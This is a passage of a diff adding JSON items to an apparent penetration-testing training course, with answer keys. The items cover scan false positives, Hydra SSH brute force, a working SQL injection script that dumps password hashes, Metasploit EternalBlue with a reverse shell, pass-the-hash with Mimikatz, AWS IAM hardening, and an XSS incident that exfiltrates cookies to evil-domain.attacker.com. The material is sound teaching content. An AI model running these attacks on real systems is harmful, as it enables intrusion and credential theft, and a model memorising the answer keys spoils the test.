auto-detected from the extension (`.txt`, `.html`, `.xml`, `.csv`). XML output (e.g., `-o output.xml`) is preferred for pentest reports as it can be imported directly into vulnerability management platforms and report generation tools, preserving finding structure and metadata."
+  },
+  {
+    "id": "comptia-false-positive-analysis",
+    "title": "False Positive Identification in Scan Findings",
+    "description": "Identify the two false positives among five vulnerability scanner findings by inspecting the evidence panels and cross-referencing version and protocol data.",
+    "type": "diagnose",
+    "timeLimit": 480,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Vulnerability Analysis",
+    "technologies": ["Nessus", "Vulnerability Validation", "False Positive Analysis"],
+    "labCategory": "Troubleshoot",
+    "nodes": [
+      {"id": "host", "label": "Target Host — 10.10.10.80", "x": 350, "y": 200},
+      {"id": "f1", "label": "FINDING-001: OpenSSL Heartbleed", "x": 80, "y": 40},
+      {"id": "f2", "label": "FINDING-002: MS17-010 EternalBlue", "x": 600, "y": 40},
+      {"id": "f3", "label": "FINDING-003: BEAST TLS Attack", "x": 680, "y": 200},
+      {"id": "f4", "label": "FINDING-004: SMBv1 Enabled", "x": 600, "y": 370},
+      {"id": "f5", "label": "FINDING-005: Cleartext Credentials", "x": 80, "y": 370}
+    ],
+    "edges": [
+      {"source": "f1", "target": "host"},
+      {"source": "f2", "target": "host"},
+      {"source": "f3", "target": "host"},
+      {"source": "f4", "target": "host"},
+      {"source": "f5", "target": "host"}
+    ],
+    "inspections": {
+      "host": {
+        "title": "Target System Information",
+        "details": [
+          {"label": "IP Address", "value": "10.10.10.80"},
+          {"label": "OS", "value": "Ubuntu Server 22.04 LTS"},
+          {"label": "OpenSSL Version", "value": "3.0.8 (confirmed via dpkg -l openssl)"},
+          {"label": "TLS Config", "value": "SSLProtocol TLSv1.3 only (httpd.conf)"},
+          {"label": "SMBv1 Status", "value": "Enabled (smb1 protocol active)"},
+          {"label": "Open Ports", "value": "80/tcp, 443/tcp, 445/tcp, 3389/tcp"}
+        ]
+      },
+      "f1": {
+        "title": "FINDING-001: OpenSSL CVE-2014-0160 (Heartbleed)",
+        "details": [
+          {"label": "Plugin", "value": "Nessus #20007 — OpenSSL Heartbleed"},
+          {"label": "Severity", "value": "Critical (CVSS 7.5)"},
+          {"label": "Affected Version", "value": "OpenSSL 1.0.1 through 1.0.1f"},
+          {"label": "Detected Version", "value": "1.0.1 (from HTTP Server banner)"},
+          {"label": "Installed Version", "value": "3.0.8 (confirmed by dpkg -l openssl)"},
+          {"label": "Note", "value": "Banner string pre-dates the installed upgrade. Package manager is authoritative source."}
+        ]
+      },
+      "f2": {
+        "title": "FINDING-002: MS17-010 EternalBlue (CVE-2017-0144)",
+        "details": [
+          {"label": "Plugin", "value": "Nessus #97833 — EternalBlue SMB RCE"},
+          {"label": "Severity", "value": "Critical (CVSS 9.3)"},
+          {"label": "Affected Port", "value": "445/tcp"},
+          {"label": "Exploit Result", "value": "NT AUTHORITY\\SYSTEM shell obtained"},
+          {"label": "OS Version", "value": "Windows Server 2008 R2 SP1 (unpatched)"},
+          {"label": "Patch Status", "value": "KB4012212 (MS17-010) not applied"}
+        ]
+      },
+      "f3": {
+        "title": "FINDING-003: BEAST TLS Attack (CVE-2011-3389)",
+        "details": [
+          {"label": "Plugin", "value": "Nessus #58751 — SSL/TLS BEAST Attack"},
+          {"label": "Severity", "value": "Medium (CVSS 4.3)"},
+          {"label": "Affected Versions", "value": "TLS 1.0 and SSL 3.0 with CBC ciphers"},
+          {"label": "Server TLS Config", "value": "TLS 1.3 only — SSLProtocol TLSv1.3"},
+          {"label": "Handshake Verification", "value": "openssl s_client: TLS 1.3 negotiated, no TLS 1.0 offered"},
+          {"label": "Note", "value": "Plugin triggered on stale heuristic. Server does not support any vulnerable protocol version."}
+        ]
+      },
+      "f4": {
+        "title": "FINDING-004: SMBv1 Protocol Enabled",
+        "details": [
+          {"label": "Plugin", "value": "Nessus #57690 — SMBv1 Enabled"},
+          {"label": "Severity", "value": "High (CVSS 7.5)"},
+          {"label": "Affected Port", "value": "445/tcp"},
+          {"label": "Nmap Verification", "value": "smb-protocols script: SMBv1 active"},
+          {"label": "Registry Confirmation", "value": "EnableSMB1Protocol = True"},
+          {"label": "Note", "value": "Confirmed by two independent methods. Disable SMBv1 per MS Security Advisory 2696547."}
+        ]
+      },
+      "f5": {
+        "title": "FINDING-005: Cleartext Credentials over HTTP",
+        "details": [
+          {"label": "Plugin", "value": "Nessus #26194 — Cleartext Password over HTTP"},
+          {"label": "Severity", "value": "High (CVSS 7.1)"},
+          {"label": "Affected URL", "value": "http://10.10.10.80/admin/login"},
+          {"label": "Evidence", "value": "POST body: username=admin&password=Adm1n@Corp (plaintext)"},
+          {"label": "Network Exposure", "value": "Internal network only — not internet-facing"},
+          {"label": "Note", "value": "Internal-only does not eliminate risk. ARP spoofing and compromised internal hosts can intercept plaintext credentials."}
+        ]
+      }
+    },
+    "answers": [
+      {
+        "id": "a1",
+        "text": "FINDING-001 is a false positive — the scanner used an outdated HTTP banner to identify OpenSSL 1.0.1, but the installed version is 3.0.8 which is not affected by Heartbleed",
+        "correct": true
+      },
+      {
+        "id": "a2",
+        "text": "FINDING-002 is a false positive — the EternalBlue exploit completed but the session was immediately dropped by a host-based firewall rule",
+        "correct": false
+      },
+      {
+        "id": "a3",
+        "text": "FINDING-003 is a false positive — BEAST requires TLS 1.0 or SSL 3.0 with CBC ciphers, but the server only negotiates TLS 1.3 which is not affected by this attack",
+        "correct": true
+      },
+      {
+        "id": "a4",
+        "text": "FINDING-004 is a false positive — Nmap's smb-protocols script misidentified SMBv1 due to a packet fragmentation artefact",
+        "correct": false
+      },
+      {
+        "id": "a5",
+        "text": "FINDING-005 is a false positive — the endpoint is internal-only so credential interception is not a realistic attack vector",
+        "correct": false
+      }
+    ],
+    "explanation": "**FINDING-001 — False Positive (OpenSSL Heartbleed)**\n\nNessus plugin #20007 matched the OpenSSL version from the HTTP `Server` banner. Banner grabbing is unreliable — web servers frequently retain outdated version strings after package upgrades. The package manager (`dpkg -l openssl`) is the authoritative source and confirms version 3.0.8, released in 2023, which is not affected by CVE-2014-0160. Mark as false positive with the validated version as supporting evidence in the report.\n\n**FINDING-002 — Confirmed: EternalBlue RCE**\n\nThe plugin executed the exploit and obtained `NT AUTHORITY\\SYSTEM` access — this is not a version fingerprint match but a confirmed exploitation. Windows Server 2008 R2 SP1 without KB4012212 is definitively vulnerable. This is a critical confirmed finding that must be escalated immediately per the rules of engagement escalation path.\n\n**FINDING-003 — False Positive (BEAST TLS)**\n\nCVE-2011-3389 (BEAST) is exploitable only when the server negotiates TLS 1.0 or SSL 3.0 with CBC cipher suites. The server's Apache config specifies `SSLProtocol TLSv1.3`, confirmed by an `openssl s_client` handshake that shows TLS 1.3 with no TLS 1.0 fallback offered. TLS 1.3 uses AEAD cipher modes exclusively and is not affected by BEAST. The plugin fired on a stale detection heuristic that did not verify the actual negotiated protocol.\n\n**FINDING-004 — Confirmed: SMBv1**\n\nTwo independent verification methods — Nmap's `smb-protocols` NSE script and the Windows registry key — both confirm SMBv1 is active. SMBv1 is the attack surface exploited by EternalBlue (FINDING-002) and WannaCry. This is a valid high-severity finding that directly enables the critical RCE in FINDING-002.\n\n**FINDING-005 — Confirmed: Cleartext Credentials**\n\nThe admin login form submits credentials in plaintext over HTTP. Internal-only network exposure does not eliminate the finding — ARP spoofing, rogue access points, and SSRF from a compromised host on the same segment can all intercept traffic. The finding is valid and should be reported with a recommendation to enforce HTTPS with HSTS and an HTTPS-only cookie attribute."
+  },
+  {
+    "id": "comptia-hydra-ssh-brute",
+    "title": "SSH Brute Force with Hydra",
+    "description": "Run Hydra brute-force commands against an SSH service using single-user and multi-user wordlist attacks while limiting threads to avoid account lockout.",
+    "type": "cli",
+    "timeLimit": 480,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Authentication Attacks",
+    "technologies": ["Hydra", "Brute Force", "SSH", "Wordlists"],
+    "labCategory": "Implement",
+    "scenario": "A target host at 10.10.10.22 has SSH exposed on port 22. Intelligence gathered during reconnaissance identified potential usernames. You need to: (1) run a single-user attack against the admin account using rockyou.txt, (2) run a multi-user attack against a username list with reduced threads to avoid triggering account lockout.\n\nComplete each task using the simulated terminal below.",
+    "commands": [
+      {
+        "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.22",
+        "output": "Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-15 10:12:33\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://10.10.10.22:22/\n[22][ssh] host: 10.10.10.22   login: admin   password: sunshine1\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-15 10:14:07"
+      },
+      {
+        "command": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.22 -t 4",
+        "output": "Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-15 10:16:00\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 57377596 login tries (l:4/p:14344399), ~14344399 tries per task\n[DATA] attacking ssh://10.10.10.22:22/\n[22][ssh] host: 10.10.10.22   login: sysadmin   password: Password123!\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-15 10:18:45"
+      }
+    ],
+    "expectedCommands": [
+      "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.22",
+      "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.22 -t 4"
+    ],
+    "answers": [
+      {
+        "id": "a1",
+        "text": "Which Hydra flag limits parallel connection threads to avoid triggering SSH account lockout policies?",
+        "correct": true
+      },
+      {
+        "id": "a2",
+        "text": "What is the difference between the -l (lowercase) and -L (uppercase) flags in Hydra?",
+        "correct": true
+      },
+      {
+        "id": "a3",
+        "text": "Why is brute-force attack typically performed as a last resort and not early in an engagement?",
+        "correct": true
+      }
+    ],
+    "explanation": "**`-l` vs `-L`**\n\n`-l` (lowercase) specifies a single username directly: `-l admin`. `-L` (uppercase) loads a list of usernames from a file: `-L users.txt`. The same convention applies to passwords: `-p` for a single password, `-P` for a wordlist file.\n\n**`-t 4` — thread limiting**\n\nHydra defaults to 16 parallel tasks per host. Many SSH servers and enterprise authentication systems enforce account lockout after 3–5 failed attempts, or rate-limit connections. Using `-t 4` reduces parallelism, slowing the attack but reducing the risk of locking out the account or triggering an IDS alert. The Hydra warning message itself recommends `-t 4` for SSH.\n\n**Brute force as a last resort**\n\nBrute-force attacks are noisy, time-consuming, and risk account lockouts that disrupt legitimate users. In most engagements they are reserved for: (1) offline cracking of captured hashes, (2) password spraying when lockout thresholds are known to be high, or (3) specific scope items where no alternative exists. Credential stuffing (using known breach data) and pass-the-hash are often more efficient alternatives."
+  },
+  {
+    "id": "comptia-sqli-payload-fix",
+    "title": "Fix a Broken SQL Injection Script",
+    "description": "Debug three errors in a Python UNION-based SQL injection script: a wrong column count, an unencoded ORDER BY payload, and a mismatched response regex.",
+    "type": "code-fix",
+    "timeLimit": 600,
+    "difficulty": "advanced",
+    "platform": "CompTIA",
+    "category": "Web Application Attacks",
+    "technologies": ["SQL Injection", "Python", "UNION-based SQLi", "requests"],
+    "labCategory": "Troubleshoot",
+    "scenario": "A Python script automates a UNION-based SQL injection attack against a vulnerable search form to extract usernames and password hashes. The script contains three bugs that prevent it from working correctly:\n\n1. The UNION SELECT column count does not match the query structure\n2. The ORDER BY fingerprinting payload is appended to the URL without URL-encoding\n3. The regex pattern does not match the actual HTML response structure\n\nFix all three bugs.",
+    "language": "python",
+    "brokenCode": "import requests\nimport re\nimport urllib.parse\n\nTARGET = \"http://10.10.10.80/search\"\nSESSION_TOKEN = \"a3f5d9e1b2c4f6e8\"\n\ndef test_order_by(n):\n    '''Test ORDER BY n to fingerprint the column count.'''\n    payload = f\"1' ORDER BY {n}-- -\"\n    url = TARGET + \"?id=\" + payload\n    r = requests.get(url, cookies={\"PHPSESSID\": SESSION_TOKEN})\n    return \"You have an error in your SQL syntax\" not in r.text\n\ndef get_column_count():\n    '''Return the number of columns in the vulnerable query.'''\n    for n in range(1, 10):\n        if not test_order_by(n):\n            return n - 1\n    return -1\n\ndef extract_credentials():\n    '''Dump usernames and password hashes using UNION SELECT.'''\n    payload = \"0' UNION SELECT username,password_hash,NULL FROM users-- -\"\n    r = requests.get(TARGET, params={\"id\": payload},\n                     cookies={\"PHPSESSID\": SESSION_TOKEN})\n    return re.findall(r'<td class=\"user\">(.+?)</td>', r.text)\n\nif __name__ == \"__main__\":\n    print(\"[*] Fingerprinting column count via ORDER BY...\")\n    cols = get_column_count()\n    print(f\"[+] Found {cols} columns\")\n\n    print(\"[*] Extracting credentials via UNION SELECT...\")\n    creds = extract_credentials()\n    if creds:\n        for c in creds:\n            print(f\"  [+] {c}\")\n    else:\n        print(\"  [-] No results. Check column count and regex.\")",
+    "correctCode": "import requests\nimport re\nimport urllib.parse\n\nTARGET = \"http://10.10.10.80/search\"\nSESSION_TOKEN = \"a3f5d9e1b2c4f6e8\"\n\ndef test_order_by(n):\n    '''Test ORDER BY n to fingerprint the column count.'''\n    payload = f\"1' ORDER BY {n}-- -\"\n    url = TARGET + \"?id=\" + urllib.parse.quote(payload)\n    r = requests.get(url, cookies={\"PHPSESSID\": SESSION_TOKEN})\n    return \"You have an error in your SQL syntax\" not in r.text\n\ndef get_column_count():\n    '''Return the number of columns in the vulnerable query.'''\n    for n in range(1, 10):\n        if not test_order_by(n):\n            return n - 1\n    return -1\n\ndef extract_credentials():\n    '''Dump usernames and password hashes using UNION SELECT.'''\n    payload = \"0' UNION SELECT username,password_hash,NULL,NULL FROM users-- -\"\n    r = requests.get(TARGET, params={\"id\": payload},\n                     cookies={\"PHPSESSID\": SESSION_TOKEN})\n    return re.findall(r'<td class=\"data\">(.+?)</td>', r.text)\n\nif __name__ == \"__main__\":\n    print(\"[*] Fingerprinting column count via ORDER BY...\")\n    cols = get_column_count()\n    print(f\"[+] Found {cols} columns\")\n\n    print(\"[*] Extracting credentials via UNION SELECT...\")\n    creds = extract_credentials()\n    if creds:\n        for c in creds:\n            print(f\"  [+] {c}\")\n    else:\n        print(\"  [-] No results. Check column count and regex.\")",
+    "validations": [
+      {
+        "field": "ORDER BY URL encoding",
+        "expected": "urllib.parse.quote(payload)"
+      },
+      {
+        "field": "UNION column count",
+        "expected": "4 columns — NULL,NULL"
+      },
+      {
+        "field": "response regex class",
+        "expected": "class=\"data\""
+      }
+    ],
+    "explanation": "**Bug 1 — Unencoded ORDER BY payload**\n\n`url = TARGET + \"?id=\" + payload` appends the raw payload string directly to the URL. The payload `1' ORDER BY 3-- -` contains a single quote, spaces, and hyphens that must be percent-encoded for the request to be formed correctly. Without encoding, the apostrophe and spaces may be mangled by the HTTP library or rejected by the server, producing incorrect results. The fix is `urllib.parse.quote(payload)`, which encodes special characters as `%27`, `%20`, etc. Note that `requests.get(params=...)` handles encoding automatically — the bug exists only in `test_order_by()` where the URL is manually constructed.\n\n**Bug 2 — Wrong UNION column count**\n\n`UNION SELECT username,password_hash,NULL` injects 3 columns. If the original query selects 4 columns, the UNION fails with a column count mismatch error and returns no results. The `ORDER BY` fingerprinting step revealed 4 columns, so the payload must be `UNION SELECT username,password_hash,NULL,NULL` — matching the column count with padding `NULL` values. This is why column enumeration is always performed before UNION extraction.\n\n**Bug 3 — Regex class mismatch**\n\n`re.findall(r'<td class=\"user\">', r.text)` looks for `class=\"user\"` in the response HTML, but the application renders data in `<td class=\"data\">` elements. When adapting injection scripts to new targets, always inspect the actual response HTML before writing the extraction regex. Tools like Burp Repeater or `curl | grep` help identify the correct element structure."
+  },
+  {
+    "id": "comptia-metasploit-eternalblue",
+    "title": "Metasploit EternalBlue Exploitation Flow",
+    "description": "Complete five msfconsole command templates to search for, configure, and launch the EternalBlue SMB exploit against a target host.",
+    "type": "fill-command",
+    "timeLimit": 360,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Service Exploitation",
+    "technologies": ["Metasploit", "msfconsole", "EternalBlue", "SMB"],
+    "labCategory": "Implement",
+    "scenario": "A target host at 10.10.10.100 is running an unpatched Windows SMB service vulnerable to MS17-010 (EternalBlue). Your listener IP is 10.10.14.5.\n\nComplete each msfconsole command to search for the module, select it, configure the target and payload, and execute the exploit.",
+    "questions": [
+      {
+        "id": "q1",
+        "template": "search ___",
+        "blanks": [
+          {
+            "id": "b1",
+            "placeholder": "vulnerability name",
+            "answer": "eternalblue"
+          }
+        ],
+        "hint": "Search for the MS17-010 exploit by its common name"
+      },
+      {
+        "id": "q2",
+        "template": "use ___",
+        "blanks": [
+          {
+            "id": "b1",
+            "placeholder": "module path",
+            "answer": "exploit/windows/smb/ms17_010_eternalblue"
+          }
+        ],
+        "hint": "Full module path from the search results"
+      },
+      {
+        "id": "q3",
+        "template": "set RHOSTS ___",
+        "blanks": [
+          {
+            "id": "b1",
+            "placeholder": "target IP",
+            "answer": "10.10.10.100"
+          }
+        ],
+        "hint": "Set the remote target host IP address"
+      },
+      {
+        "id": "q4",
+        "template": "set ___ windows/x64/meterpreter/reverse_tcp",
+        "blanks": [
+          {
+            "id": "b1",
+            "placeholder": "option name",
+            "answer": "PAYLOAD"
+          }
+        ],
+        "hint": "The Metasploit option that specifies the payload module"
+      },
+      {
+        "id": "q5",
+        "template": "set LHOST ___ && ___",
+        "blanks": [
+          {
+            "id": "b1",
+            "placeholder": "listener IP",
+            "answer": "10.10.14.5"
+          },
+          {
+            "id": "b2",
+            "placeholder": "execute command",
+            "answer": "run"
+          }
+        ],
+        "hint": "Set the listener IP address, then execute the exploit"
+      }
+    ],
+    "explanation": "**Module search and selection**\n\n`search eternalblue` queries the Metasploit module database for exploits related to EternalBlue (MS17-010). The results show the full module path `exploit/windows/smb/ms17_010_eternalblue`, which is passed to `use` to load the module into the active context.\n\n**RHOSTS vs RHOST**\n\nModern Metasploit uses `RHOSTS` (plural) to support multiple targets. Setting `RHOSTS` to a single IP, a range (`10.10.10.1-254`), or a CIDR block (`10.10.10.0/24`) is all valid. Legacy modules may still use `RHOST` (singular).\n\n**PAYLOAD option**\n\n`set PAYLOAD windows/x64/meterpreter/reverse_tcp` loads the 64-bit Windows Meterpreter reverse shell as the payload. A staged payload (`/`) downloads and executes the second stage after initial code execution — requiring an active Metasploit listener. Choose `x64` vs `x86` based on the target OS architecture identified during enumeration.\n\n**`run` vs `exploit`**\n\nBoth `run` and `exploit` execute the loaded module — they are aliases. `run` is the preferred modern form. After successful exploitation, Meterpreter opens an interactive session. Use `sessions -l` to list active sessions and `sessions -i <id>` to interact with them.\n\n**LHOST**\n\n`LHOST` must be the IP address reachable by the target for the reverse shell callback. On an internal pentest this is your VPN or LAN IP. Using `0.0.0.0` or the wrong interface IP results in the exploit succeeding but no session being established."
+  },
+  {
+    "id": "comptia-pass-the-hash-sequence",
+    "title": "Pass-the-Hash Attack Sequence",
+    "description": "Arrange seven steps in the correct order to execute a pass-the-hash attack from initial workstation foothold to authenticated domain controller access.",
+    "type": "ordering",
+    "timeLimit": 300,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Credential Attacks",
+    "technologies": ["Pass-the-Hash", "Mimikatz", "NTLM", "CrackMapExec", "Lateral Movement"],
+    "labCategory": "Implement",
+    "scenario": "An authenticated penetration test has provided initial access to a domain-joined Windows workstation. You will now execute a pass-the-hash attack to authenticate to the domain controller without cracking any passwords.\n\nArrange the seven steps in the correct sequence.",
+    "steps": [
+      {
+        "id": "s1",
+        "text": "Gain initial foothold on a domain-joined workstation through phishing or service exploitation",
+        "correctPosition": 1
+      },
+      {
+        "id": "s2",
+        "text": "Escalate privileges to local administrator on the compromised workstation",
+        "correctPosition": 2
+      },
+      {
+        "id": "s3",
+        "text": "Run Mimikatz and execute sekurlsa::logonpasswords to extract cached credentials from LSASS memory",
+        "correctPosition": 3
+      },
+      {
+        "id": "s4",
+        "text": "Capture the NTLM hash for the domain administrator account from Mimikatz output",
+        "correctPosition": 4
+      },
+      {
+        "id": "s5",
+        "text": "Use CrackMapExec with the captured NTLM hash to authenticate to the domain controller",
+        "correctPosition": 5
+      },
+      {
+        "id": "s6",
+        "text": "Verify domain controller access and enumerate high-value resources without cracking the plaintext password",
+        "correctPosition": 6
+      },
+      {
+        "id": "s7",
+        "text": "Document the complete pass-the-hash attack chain with timestamps and screenshots in the attack narrative",
+        "correctPosition": 7
+      }
+    ],
+    "explanation": "**Why local administrator is required before Mimikatz**\n\nMimikatz's `sekurlsa::logonpasswords` reads directly from the LSASS (Local Security Authority Subsystem Service) process memory. LSASS is a protected system process — accessing it requires either SYSTEM or local administrator privileges with the `SeDebugPrivilege` right. Attempting to run Mimikatz as a standard user fails with an access denied error.\n\n**How pass-the-hash works**\n\nWindows NTLM authentication does not require the plaintext password — the protocol accepts the NT hash directly as proof of identity. When a client authenticates to a remote service, it responds to the server's challenge using the hash derived from the password. CrackMapExec (`-H <NTLM_hash>`) and Impacket tools (`pth-winexe`, `wmiexec.py`) exploit this by injecting the captured hash into the authentication flow, granting access without ever knowing the plaintext.\n\n**Pass-the-hash vs pass-the-ticket**\n\nPass-the-hash (PtH) exploits NTLM authentication and works against any service that accepts NTLM. Pass-the-ticket (PtT) steals Kerberos TGTs or service tickets from LSASS memory and works against Kerberos-protected resources. Both are extracted by Mimikatz — PtH via `sekurlsa::logonpasswords`, PtT via `sekurlsa::tickets` or `kerberos::list`.\n\n**Credential Guard**\n\nWindows Credential Guard (available from Windows 10 and Server 2016) stores NTLM hashes and Kerberos tickets in an isolated virtualization-based security (VBS) container, preventing LSASS extraction. In environments with Credential Guard enabled, alternative techniques such as DCSync or Kerberoasting are required."
+  },
+  {
+    "id": "comptia-cloud-iam-hardening",
+    "title": "Cloud IAM Misconfiguration Attack Surface",
+    "description": "Identify and remediate three AWS IAM misconfigurations: an overly permissive EC2 instance role, IMDSv1 enabled on an EC2 instance, and an unrestricted Lambda AssumeRole permission.",
+    "type": "security-hardening",
+    "timeLimit": 480,
+    "difficulty": "advanced",
+    "platform": "CompTIA",
+    "category": "Cloud Security",
+    "technologies": ["AWS IAM", "EC2 Metadata Service", "SSRF", "Cloud Security", "IMDSv2"],
+    "labCategory": "Troubleshoot",
+    "scenario": "A cloud security review of a client's AWS account has identified three IAM-related misconfigurations that create a credential theft and privilege escalation attack surface. Review each resource and select the correct remediation.",
+    "issues": [
+      {
+        "id": "issue1",
+        "resource": "EC2 Instance Profile — arn:aws:iam::123456789012:instance-profile/web-server-role",
+        "issue": "Attached IAM policy grants iam:* and s3:* with Resource: \"*\" — full IAM control and unrestricted S3 access from the web server instance",
+        "options": [
+          "Restrict policy to minimum required actions and specific resource ARNs",
+          "Remove the IAM role from the EC2 instance entirely",
+          "Enable AWS CloudTrail to log all IAM API calls",
+          "No action required — IAM roles are bounded by account trust boundaries"
+        ],
+        "correctOption": "Restrict policy to minimum required actions and specific resource ARNs"
+      },
+      {
+        "id": "issue2",
+        "resource": "EC2 Instance Metadata Service — 10.10.10.100 (HttpTokens: optional)",
+        "issue": "IMDSv1 is enabled — unauthenticated GET requests to http://169.254.169.254/latest/meta-data/iam/security-credentials/ return temporary IAM credentials without requiring a session token",
+        "options": [
+          "Enforce IMDSv2 by setting HttpTokens to required — disable IMDSv1 token-optional mode",
+          "Block 169.254.169.254 in the VPC route table to prevent metadata access",
+          "Rotate the IAM credentials attached to the instance profile",
+          "No action required — the metadata service is restricted to the instance loopback"
+        ],
+        "correctOption": "Enforce IMDSv2 by setting HttpTokens to required — disable IMDSv1 token-optional mode"
+      },
+      {
+        "id": "issue3",
+        "resource": "Lambda Execution Role — arn:aws:iam::123456789012:role/lambda-processor-role",
+        "issue": "Execution role includes sts:AssumeRole with Resource: \"arn:aws:iam::*:role/*\" — allows the Lambda function to assume any role in any account",
+        "options": [
+          "Scope sts:AssumeRole to the specific target role ARN required by the function",
+          "Remove sts:AssumeRole from the Lambda execution role entirely",
+          "Add a Condition requiring MFA for any sts:AssumeRole call",
+          "No action required — cross-account role assumption requires an explicit trust policy on the target role"
+        ],
+        "correctOption": "Scope sts:AssumeRole to the specific target role ARN required by the function"
+      }
+    ],
+    "explanation": "**Issue 1 — Over-privileged EC2 Instance Role**\n\n`iam:*` grants the ability to create, modify, and attach IAM policies — a path to privilege escalation within the account. An attacker who gains code execution on the web server (via RCE or SSRF) can use the instance credentials to create a new admin user or attach an `AdministratorAccess` policy to an existing account. The remediation is least-privilege: grant only the specific actions the application requires (e.g., `s3:GetObject` on a specific bucket ARN), never wildcards on sensitive services.\n\n**Issue 2 — IMDSv1 Enabled (SSRF Attack Chain)**\n\nIMDSv1 serves IAM credentials to any process that can reach `http://169.254.169.254/`. If the application is vulnerable to SSRF, an attacker can forge a request to this address and retrieve temporary `AccessKeyId`, `SecretAccessKey`, and `SessionToken` values — effectively stealing the instance's IAM identity. IMDSv2 requires a PUT request to obtain a session token first, which SSRF attacks cannot perform due to HTTP method restrictions. Enforcing IMDSv2 (`HttpTokens: required`) breaks the SSRF → credential theft chain.\n\n**Issue 3 — Unrestricted AssumeRole**\n\n`sts:AssumeRole` on `arn:aws:iam::*:role/*` allows the Lambda to attempt to assume any role in any AWS account. While it still requires the target role's trust policy to permit the assumption, this is unnecessarily broad. If any role in the account or a partner account has an overly permissive trust policy (e.g., `Principal: {\"AWS\": \"*\"}`), the Lambda can assume it and escalate privileges. Scope the resource to the exact ARN of the target role — this is the principle of least privilege applied to cross-service trust."
+  },
+  {
+    "id": "comptia-xss-incident-response",
+    "title": "XSS Incident Response",
+    "description": "Analyse stored XSS attack evidence across WAF alerts, application logs, and network metrics, then select the three correct immediate response actions.",
+    "type": "incident-response",
+    "timeLimit": 480,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Web Application Attacks",
+    "technologies": ["XSS", "Web Application Security", "Incident Response", "WAF", "Browser Security"],
+    "labCategory": "Troubleshoot",
+    "scenario": "A stored cross-site scripting (XSS) attack has been detected against the comment section of a public-facing blog application. WAF logs show a filter bypass, application logs show injected script content in the database, and network metrics show active cookie exfiltration to an external domain.\n\nReview the alerts, logs, and metrics, then select the three correct immediate response actions.",
+    "alerts": [
+      {
+        "id": "a1",
+        "severity": "warning",
+        "time": "08:52",
+        "service": "WAF",
+        "message": "XSS filter bypass detected: encoded script tag in POST /comment from 203.0.113.42 — action: log-only (WAF rule in detection mode)"
+      },
+      {
+        "id": "a2",
+        "severity": "critical",
+        "time": "13:02",
+        "service": "Application Monitor",
+        "message": "Stored XSS confirmed: <script> variant found in 3 comment records — payload executes on page load for all viewers"
+      },
+      {
+        "id": "a3",
+        "severity": "critical",
+        "time": "13:05",
+        "service": "Network Monitor",
+        "message": "Cookie exfiltration in progress: 67 outbound GET requests to evil-domain.attacker.com in 4 minutes from user browser IPs"
+      },
+      {
+        "id": "a4",
+        "severity": "info",
+        "time": "08:30",
+        "service": "Application",
+        "message": "Scheduled maintenance: comment moderation queue processed normally — 0 policy violations flagged"
+      }
+    ],
+    "metrics": [
+      {
+        "id": "m1",
+        "name": "POST requests to /comment (per minute)",
+        "unit": "requests/min",
+        "values": [
+          {"time": "08:00", "value": 2},
+          {"time": "08:30", "value": 3},
+          {"time": "09:00", "value": 47},
+          {"time": "09:30", "value": 4},
+          {"time": "10:00", "value": 3},
+          {"time": "10:30", "value": 5},
+          {"time": "11:00", "value": 4},
+          {"time": "11:30", "value": 6},
+          {"time": "12:00", "value": 5},
+          {"time": "12:30", "value": 4},
+          {"time": "13:00", "value": 8}
+        ]
+      },
+      {
+        "id": "m2",
+        "name": "Outbound requests to external domains (per minute)",
+        "unit": "requests/min",
+        "values": [
+          {"time": "08:00", "value": 0},
+          {"time": "08:30", "value": 0},
+          {"time": "09:00", "value": 0},
+          {"time": "09:30", "value": 0},
+          {"time": "10:00", "value": 0},
+          {"time": "10:30", "value": 0},
+          {"time": "11:00", "value": 0},
+          {"time": "11:30", "value": 14},
+          {"time": "12:00", "value": 22},
+          {"time": "12:30", "value": 31},
+          {"time": "13:00", "value": 67}
+        ]
+      }
+    ],
+    "logs": [
+      {
+        "timestamp": "08:52:14",
+        "level": "WARN",
+        "source": "WAF",
+        "message": "Rule XSS-010 triggered: POST /comment body contains encoded script sequence — action: log-only (rule in detection mode, not blocking)"
+      },
+      {
+        "timestamp": "09:04:31",
+        "level": "INFO",
+        "source": "Application",
+        "message": "Comment id=4891 stored to database — user=guest@external.com, post=/blog/post/22, content length=312 bytes"
+      },
+      {
+        "timestamp": "11:30:07",
+        "level": "ERROR",
+        "source": "Application",
+        "message": "JS error report received from 14 browser sessions on /blog/post/22 — payload executing on page load"
+      },
+      {
+        "timestamp": "13:05:12",
+        "level": "ERROR",
+        "source": "Network",
+        "message": "Anomalous outbound: GET https://evil-domain.attacker.com/c?d=<base64_cookie> — 67 requests in 4 minutes from distinct user browser IPs"
+      }
+    ],
+    "timeline": [
+      {"time": "08:52", "event": "Attacker POSTs encoded XSS payload to /comment — WAF logs but does not block (detection-mode rule)"},
+      {"time": "09:04", "event": "Malicious comment stored in database — payload contains obfuscated script tag that evaded the WAF filter"},
+      {"time": "11:30", "event": "Authenticated users begin viewing blog post /blog/post/22 — stored payload executes in their browsers"},
